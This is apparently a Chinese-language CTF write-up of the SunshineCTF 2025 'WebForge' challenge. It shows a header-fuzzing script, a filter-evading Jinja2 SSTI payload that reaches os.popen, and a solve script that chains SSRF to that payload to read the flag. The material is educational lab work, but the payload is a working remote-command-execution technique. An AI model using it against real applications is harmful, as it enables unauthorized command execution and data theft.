---
date: '2025-10-26T13:21:03+08:00'
draft: false
title: 'CTF_WebForge'
tags: [ "CTF", "web", "Docker"]
---
# WebForge

這次解的題目是今年10月舉辦的 SunshineCTF 中的 WebForge

<!--more-->

## Description

連線後打開網頁如圖

![image](/images/post-images/Sunshine2025-1.png)
![image](/images/post-images/Sunshine2025-2.png)

中間的 `LAUNCH SSRF TOOL` 是可以按的，會跳轉到 `/fetch` 頁面
但是會顯示 403 Forbidden

![image](/images/post-images/Sunshine2025-3.png)

打開 source code 中有提到的 `/robots.txt` 頁面

![image](/images/post-images/Sunshine2025-4.png)

顯示 `/fetch` 和 `/admin` 需要特定的 auth header 才可以訪問

再去看 `/admin` 頁面

![image](/images/post-images/Sunshine2025-5.png)

感覺是需要從 `/fetch` 進去後透過訪問 `/admin` 頁面做 SSRF，但也不太確定

## Solution

有點沒想法，google 搜尋找到了 [headerpwn](https://github.com/devanshbatham/headerpwn/) 這個工具

先試試看用暴搜的方法，需要先下載 `headers.txt` 這個檔案

`find_header.py`

```python
import requests

url = "http://127.0.0.1:25303/fetch"

headers_to_try = [line.split(":")[0] for line in open("headers.txt")]
values = ["true"]

for h in headers_to_try:
    for v in values:
        r = requests.get(url, headers={h: v}, allow_redirects=False, timeout=5)
        # print(f"{h}: {v} -> {r.status_code}")
        if r.status_code != 403:
            print("Possible winner:", h, v)
            break
```

`output`
```txt
Possible winner: Allow true
Possible winner: Content-Length true
Possible winner: Referer  true
Possible winner: Transfer-Encoding true
Possible winner: X-Forwarded-Ssl  true
Possible winner: X_Forwarded_Ssl  true
```

看來這些都不會導致 status code 403，用最簡單的 Allow true 就好

接下來再觀察 source code，在 `fetch.html` 中有一個可能可以 SSRF 的 endpoint

```html
<div class="form-container">
            <form method="POST" class="fetch-form">
                <div class="form-group">
                    <label for="url">Target URL</label>
                    <input type="url" id="url" name="url" placeholder="https://example.com" required>
                    <small class="hint">Enter a complete URL including http:// or https://</small>
                </div>
                <button type="submit" class="btn">Launch Request</button>
            </form>
        </div>
```

看起來可以用 POST 的方式 SSRF，我們需要訪問 `/admin` 頁面

但 `app.py` 中有幾個關鍵點

```python
@app.route('/admin', methods=['GET'])
def admin():
    if request.remote_addr != "127.0.0.1":
        abort(403)
        
    if request.method != 'GET':
        abort(405)  # Method Not Allowed

    template_input = request.args.get("template", "")
    if not template_input:
        return "Missing information in the ?template= parameter in the URL", 400

    if '.' in template_input or '_' in template_input:
        return "Nope."
    
    try:
        return render_template_string(template_input)
    except Exception as e:
        return f"Template error: {e}"

if __name__ == "__main__":
    app = create_app()
    app.run(host="0.0.0.0", port=3000)
```

1. 他只允許主機訪問
2. 訪問`/admin` 的時候要帶 template 參數
3. template 過濾掉 `.` 和 `_`

說到 template 第一反應就是 SSTI，但是他又有黑名單

google 搜尋 SSTI payload 找到 [Server Side Template Injection with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)

裡面有提到當過濾了`.` 和 `_` 時可以採取的 payload
```py
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

其實就是 
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
的變形

說明一下這個 payload 的用途:
- `request` : 代表當前 HTTP Request
- `application` : 可以存取系統內建功能
- `__globals__` : 提升至全域變數範圍
- `__builtins__` : 存取 Python 的內建函數
- `__import__('os')` : 動態載入 OS 模組
- `popen()`： os 模組中的一個函數，可執行一個 shell 命令
- `read()` : 讀取並輸出結果

理想情況把 id 換成我們要的指令就可以得到 flag 了

<details close><summary>solve.py</summary>

```python
import requests

url =  "http://127.0.0.1:25303/fetch"

SSTI_payload = "{{request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']('os')['popen']('cat f*')['read']()}}"

resp = requests.post(
    url,
    headers={"Allow": "true"},
    data={
        "url": "http://127.0.0.1:8000/admin?template=" + SSTI_payload
    },
)

flag_start = resp.text.find("sun{")
flag_end = resp.text.find("}", flag_start)
flag = resp.text[flag_start:flag_end+1]
print("flag : ", flag)  
```

</details>

## Flag

<div class="flag-box">
<strong>
flag : sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}
</strong>
</div>